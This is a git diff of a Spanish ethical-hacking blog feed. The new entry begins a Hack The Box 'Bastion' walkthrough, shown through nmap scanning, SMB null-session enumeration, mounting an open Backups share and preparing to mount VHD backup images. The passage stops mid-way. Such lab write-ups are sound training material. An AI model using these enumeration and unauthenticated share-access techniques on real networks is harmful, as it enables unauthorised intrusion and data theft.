@@ -1,4 +1,605 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-03-18T16:14:48-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Blocky</title><link href="http://localhost:4000/htb-blocky/" rel="alternate" type="text/html" title="Hack The Box Blocky" /><published>2022-03-18T00:00:00-06:00</published><updated>2022-03-18T00:00:00-06:00</updated><id>http://localhost:4000/htb-blocky</id><content type="html" xml:base="http://localhost:4000/htb-blocky/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-blocky/banner-blocky.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-03-18T22:38:44-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Bastion</title><link href="http://localhost:4000/htb-bastion/" rel="alternate" type="text/html" title="Hack The Box Bastion" /><published>2022-03-18T00:00:00-06:00</published><updated>2022-03-18T00:00:00-06:00</updated><id>http://localhost:4000/htb-bastion</id><content type="html" xml:base="http://localhost:4000/htb-bastion/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bastion/banner-bastion.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;bastion&quot;&gt;Bastion&lt;/h2&gt;
+&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.134.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.134
+PING 10.10.10.134 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.134&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.10.134: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;137 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.134 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 136.525/136.525/136.525/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.134 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-03-18 16:24 CST
+Initiating SYN Stealth Scan at 16:24
+Scanning 10.10.10.134 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 139/tcp on 10.10.10.134
+Discovered open port 135/tcp on 10.10.10.134
+Discovered open port 445/tcp on 10.10.10.134
+Discovered open port 22/tcp on 10.10.10.134
+Discovered open port 49667/tcp on 10.10.10.134
+Discovered open port 49670/tcp on 10.10.10.134
+Discovered open port 47001/tcp on 10.10.10.134
+Discovered open port 49668/tcp on 10.10.10.134
+Discovered open port 49669/tcp on 10.10.10.134
+Discovered open port 49664/tcp on 10.10.10.134
+Discovered open port 5985/tcp on 10.10.10.134
+Discovered open port 49666/tcp on 10.10.10.134
+Discovered open port 49665/tcp on 10.10.10.134
+Completed SYN Stealth Scan at 16:24, 14.21s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.134
+Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.13s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Scanned at 2022-03-18 16:24:07 CST &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;14s
+Not shown: 65522 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT      STATE SERVICE      REASON
+22/tcp    open  ssh          syn-ack ttl 127
+135/tcp   open  msrpc        syn-ack ttl 127
+139/tcp   open  netbios-ssn  syn-ack ttl 127
+445/tcp   open  microsoft-ds syn-ack ttl 127
+5985/tcp  open  wsman        syn-ack ttl 127
+47001/tcp open  winrm        syn-ack ttl 127
+49664/tcp open  unknown      syn-ack ttl 127
+49665/tcp open  unknown      syn-ack ttl 127
+49666/tcp open  unknown      syn-ack ttl 127
+49667/tcp open  unknown      syn-ack ttl 127
+49668/tcp open  unknown      syn-ack ttl 127
+49669/tcp open  unknown      syn-ack ttl 127
+49670/tcp open  unknown      syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;14.31 seconds
+           Raw packets sent: 69080 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.040MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 68945 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.758MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+       │ Size: 179 B
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.134
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 22,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670 10.10.10.134 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-03-18 16:25 CST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.134                                                                                                
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.13s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+                                                                
+PORT      STATE SERVICE      VERSION                           
+22/tcp    open  ssh          OpenSSH for_Windows_7.9 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey:                                                  
+|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                  
+|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0       
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-server-header: Microsoft-HTTPAPI/2.0       
+|_http-title: Not Found                                         
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC                                                                               
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  msrpc        Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2022-03-18T22:26:13
+|_  start_date: 2022-03-18T22:22:59
+|_clock-skew: mean: &lt;span class=&quot;nt&quot;&gt;-20m00s&lt;/span&gt;, deviation: 34m35s, median: &lt;span class=&quot;nt&quot;&gt;-2s&lt;/span&gt;
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dangerous, but default&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Windows Server 2016 Standard 6.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   Computer name: Bastion
+|   NetBIOS computer name: BASTION&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00
+|   Workgroup: WORKGROUP&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00
+|_  System &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2022-03-18T23:26:15+01:00
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;68.59 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos el puerto 445 abierto, por lo tanto vamos a tratar de conectarnos a través de una &lt;strong&gt;&lt;em&gt;Null Session&lt;/em&gt;&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ smbclient &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 10.10.10.134 &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
+
+        Sharename       Type      Comment
+        &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
+        ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;         Disk      Remote Admin
+        Backups         Disk      
+        C&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;             Disk      Default share
+        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;           IPC       Remote IPC
+SMB1 disabled &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; no workgroup available
+❯ smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.134 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'null'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Guest session       IP: 10.10.10.134:445    Name: 10.10.10.134                                      
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/] Work[!] Unable to remove &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;directory at &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;10.10.10.134&lt;span class=&quot;se&quot;&gt;\B&lt;/span&gt;ackups&lt;span class=&quot;se&quot;&gt;\Z&lt;/span&gt;ETQPDWRLG, please remove manually
+        Disk                                                    Permissions     Comment
+        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
+        ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                 NO ACCESS       Remote Admin
+        Backups                                                 READ, WRITE
+        C&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                     NO ACCESS       Default share
+        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                   READ ONLY       Remote IPC
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que podemos acceder al recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Backups&lt;/code&gt; y tenemos permisos de lectura y escritura; por lo tanto vamos ingresar a dicho recurso.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ smbclient //10.10.10.134/Backups &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
+Try &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt; to get a list of possible commands.
+smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                   D        0  Fri Mar 18 21:18:35 2022
+  ..                                  D        0  Fri Mar 18 21:18:35 2022
+  note.txt                           AR      116  Tue Apr 16 05:10:09 2019
+  SDT65CB.tmp                         A        0  Fri Feb 22 06:43:08 2019
+  WindowsImageBackup                 Dn        0  Fri Feb 22 06:44:02 2019
+  ZETQPDWRLG                          D        0  Fri Mar 18 21:18:35 2022
+
+                5638911 blocks of size 4096. 1179128 blocks available
+
+smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Para trabajar más cómodos, vamos a crearnos una montura del recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backups&lt;/code&gt; en nuestra máquina.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /mnt/smbmounted
+❯ mount &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; cifs //10.10.10.134/backups /mnt/smbmounted/ &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;null,password&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;null,domain&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;WORKGROUP,rw
+❯ &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /mnt/smbmounted
+❯ tree
+&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+├── note.txt
+├── SDT65CB.tmp
+├── WindowsImageBackup
+│   └── L4mpje-PC
+│       ├── Backup 2019-02-22 124351
+│       │   ├── 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
+│       │   ├── 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
+│       │   ├── BackupSpecs.xml
+│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
+│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
+│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
+│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
+│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
+│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
+│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
+│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
+│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
+│       │   └── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
+│       ├── Catalog
+│       │   ├── BackupGlobalCatalog
+│       │   └── GlobalCatalog
+│       ├── MediaId
+│       └── SPPMetadataCache
+│           └── &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;cd113385-65ff-4ea2-8ced-5630f6feca8f&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+└── ZETQPDWRLG
+
+6 directories, 19 files
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vamos a descargarnos a nuestra máquina el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;note.txt&lt;/code&gt; por si existe una pista que nos ayude.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /mnt/smbmounted/note.txt &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;note.txt
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: note.txt
+       │ Size: 116 B
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ Sysadmins: please don&lt;span class=&quot;s1&quot;&gt;'t transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
+   3   │ 
+───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;La nota nos indica que no descarguemos el backup debido a que la VPN va lenta. Esta pista nos indica que igual y no deberíamos descargar los archivos de extensión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.vhd&lt;/code&gt; que se encuentran bajo la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351&lt;/code&gt;;  ya que hay uno que pesa 5.0 GB.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /mnt/smbmounted/WindowsImageBackup/L4mpje-PC/Backup&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;2019-02-22&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;124351
+.rwxr-xr-x root root  36 MB Fri Feb 22 06:44:03 2019  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
+.rwxr-xr-x root root 5.0 GB Fri Feb 22 06:45:32 2019  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
+.rwxr-xr-x root root 1.2 KB Fri Feb 22 06:45:32 2019  BackupSpecs.xml
+.rwxr-xr-x root root 1.1 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
+.rwxr-xr-x root root 8.7 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
+.rwxr-xr-x root root 6.4 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
+.rwxr-xr-x root root 2.8 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
+.rwxr-xr-x root root 1.5 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
+.rwxr-xr-x root root 1.4 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
+.rwxr-xr-x root root 3.8 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
+.rwxr-xr-x root root 3.9 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
+.rwxr-xr-x root root 6.9 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
+.rwxr-xr-x root root 2.3 MB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Por lo tanto, vamos a instalarnos la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;qemu-utils&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ apt-get &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;qemu-utils &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora, nos situamos en la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/mnt/smbmounted/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351&lt;/code&gt; y cargamos un módulo de kernel:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /mnt/smbmounted/WindowsImageBackup/L4mpje-PC/Backup&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;2019-02-22&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;124351
+❯ rmmod nbd
+rmmod: ERROR: Module nbd is not currently loaded
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que es necesario cargar el módulo &lt;strong&gt;nbd&lt;/strong&gt;, por lo que ejecutamos lo siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ modprobe nbd &lt;span class=&quot;nv&quot;&gt;max_part&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;16
+❯ &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /dev | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;nbd
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd0
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd1
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd10
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd11
